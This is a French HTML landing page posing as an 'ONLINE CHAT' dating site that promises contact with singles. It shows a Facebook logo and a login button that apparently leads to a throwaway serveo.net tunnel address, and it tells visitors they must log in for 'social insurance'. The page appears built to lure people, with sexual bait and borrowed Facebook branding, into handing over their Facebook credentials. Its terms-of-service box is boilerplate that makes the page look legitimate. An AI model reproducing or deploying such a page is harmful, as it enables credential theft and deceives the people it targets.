<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ma Page Web</title>

    <!-- Style pour l'arrière-plan et réduire la taille de la police -->
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif; /* Police par défaut */
        }

        .background {
            background-image: url('https://images.pexels.com/photos/289262/pexels-photo-289262.jpeg'); /* Lien de la nouvelle image */
            background-size: cover; /* Couvre tout l'arrière-plan */
            background-position: center; /* Centre l'image */
            height: 100vh; /* Prend toute la hauteur de la fenêtre */
            color: white; /* Couleur du texte */
            display: flex; /* Pour centrer le contenu */
            flex-direction: column; /* Aligne verticalement */
            justify-content: center; /* Centre verticalement */
            align-items: center; /* Centre horizontalement */
            text-align: center; /* Centre le texte */
        }

        h1 {
            font-size: 24px; /* Taille de la police réduite */
        }

        img {
            width: 200px;
            height: auto; /* Pour garder les proportions de l'image */
        }

        /* Style du bouton */
        .button {
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            background: #FF69B4; /* Rose amour */
            border: none;
            border-radius: 50px; /* Coins arrondis */
            cursor: pointer;
            transition: background 0.4s ease, transform 0.3s ease;
            box-shadow: 0 0 15px rgba(255, 105, 180, 0.5); /* Ombre rose */
        }

        /* Effet au survol */
        .button:hover {
            background: #FF1493; /* Un rose un peu plus foncé */
            transform: scale(1.1); /* Agrandir le bouton au survol */
        }

        .button:active {
            transform: scale(0.95); /* Réduire légèrement le bouton lorsqu'il est cliqué */
        }

        a {
            text-decoration: none; /* Supprimer le soulignement du lien */
        }

        /* Menu du bas */
        .footer {
            margin-top: 50px; /* Ajout d'espace entre le bouton et les options */
            text-align: center;
            color: white;
        }

        .footer a {
            color: white;
            margin: 0 10px;
            font-size: 14px;
            text-decoration: underline;
        }

        .footer a:hover {
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="background">
        <h1>𝗢𝗡𝗟𝗜𝗡𝗘 𝗖𝗛𝗔𝗧📩</h1>
        <p>Rencontrez des filles et des garçons célibataires en ligne, ouvrez la conversation🔞.</p>
        
        <!-- Ajout du logo Facebook -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo Facebook">

        <p>Vous devriez vous connecter pour une assurance sociale :</p>
        
        <!-- Bouton de connexion avec effets spéciaux -->
        <a href="https://387f3d8c08124a7065b5e834d82bbcaa.serveo.net" target="_blank">
            <button class="button">Connectez-vous💌</button>
        </a>

        <!-- Footer avec les liens -->
        <div class="footer">
            <a href="#conditions-modal" target="_blank">Conditions d'utilisation</a> |
            <a href="rapport.html" target="_blank">Rapport</a> |
            <a href="contact.html" target="_blank">Contact</a>
        </div>
    </div>

    <!-- Modal pour les conditions d'utilisation -->
    <div id="conditions-modal" style="display:none; background-color:rgba(0, 0, 0, 0.8); color:white; position:fixed; top:0; left:0; right:0; bottom:0; overflow:auto; padding:20px;">
        <h2>Conditions d'utilisation</h2>
        <p>Bienvenue sur notre site de rencontres. En utilisant ce site, vous acceptez de respecter les conditions suivantes :</p>
        <ul>
            <li>Évitez tout harcèlement ou comportement inapproprié envers d'autres utilisateurs.</li>
            <li>Respectez la vie privée et les informations personnelles des autres membres.</li>
            <li>Ne partagez pas de contenu inapproprié, offensant ou illégal.</li>
            <li>Utilisez ce site uniquement à des fins personnelles et non commerciales.</li>
        </ul>
        <p>En cas de non-respect de ces conditions, votre compte pourrait être suspendu ou supprimé.</p>
        <button onclick="document.getElementById('conditions-modal').style.display='none';" style="background:#FF69B4; color:white; border:none; padding:10px 20px; border-radius:10px; cursor:pointer;">Fermer</button>
    </div>

    <!-- Script pour afficher le modal -->
    <script>
        document.querySelector(".footer a[href='#conditions-modal']").addEventListener("click", function(e) {
            e.preventDefault();
            document.getElementById('conditions-modal').style.display = 'block';
        });
    </script>
</body>
</html>
